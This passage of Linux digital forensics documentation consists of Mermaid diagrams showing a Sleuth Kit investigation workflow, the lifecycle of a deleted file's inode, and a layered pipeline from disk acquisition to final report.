    N --> N3[Pointer 13: Double Indirect]
    N --> N4[Pointer 14: Triple Indirect]
```

## 4.3 Sleuth Kit Forensic Workflow

```mermaid
flowchart TD
    A[Acquire Disk Image - dd or FTK Imager] --> B[mmls - Identify Partitions]
    B --> C[fsstat - Determine FS Type and Offset]
    C --> D{File System Type?}
    D -->|ext2/ext3/ext4| E1[fls - List Files Including Deleted]
    D -->|NTFS| E2[ntfs-related tools]
    D -->|FAT| E3[fat-related tools]
    
    E1 --> F[istat - Inspect Inode Metadata]
    F --> G[icat - Extract File Content by Inode]
    G --> H[ifind - Locate Inode by Path]
    H --> I[blkls - Dump Unallocated Space]
    I --> J[mactime - Build MAC Timeline]
    J --> K[Forensic Timeline CSV]
    K --> L[Cross-reference with /var/log]
    L --> M[Final Forensic Report]
```

## 4.4 Linux File Deletion Lifecycle (Forensic Window)

```mermaid
stateDiagram-v2
    [*] --> Created: write syscall - inode allocated
    Created --> Active: i_dtime = 0 - normal use
    Active --> Active: read/write - atime/mtime updates
    Active --> Unlinked: unlink syscall - link count decremented
    Unlinked --> Unlinked: data blocks freed but inode retained
    Unlinked --> Reallocated: inode reused by new file
    Reallocated --> Overwritten: original data gone
    Active --> Reallocated: inode reused if hardlink=0
    Unlinked --> Recoverable: forensic window - dtime set
    Recoverable --> [*]: permanent loss
```

## 4.5 Block-Level Functional Architecture: Linux Forensic Analysis Pipeline

```mermaid
graph LR
    subgraph A1 [Layer 1 - Acquisition]
    A11[Suspect Disk] --> A12[Write Blocker] --> A13[Forensic Image dd E01 AFF]
    end
    
    subgraph A2 [Layer 2 - Verification]
    A13 --> A21[SHA-256 Hash] --> A22[Chain of Custody Log]
    end
    
    subgraph A3 [Layer 3 - File System Analysis]
    A13 --> A31[mmls] --> A32[fsstat] --> A33[fls recursive]
    end
    
    subgraph A4 [Layer 4 - Inode Level]
    A33 --> A41[istat per inode] --> A42[ifind / ffind]
    end
    
    subgraph A5 [Layer 5 - Data Extraction]
    A41 --> A51[icat file recovery] --> A52[blkls unallocated]
    end
    
    subgraph A6 [Layer 6 - Timeline]
    A41 --> A61[mactime] --> A62[log2timeline / Plaso]
    end
    
    subgraph A7 [Layer 7 - Reporting]
    A62 --> A71[Correlation Engine] --> A72[Final Report]
    A52 --> A71
    end
```
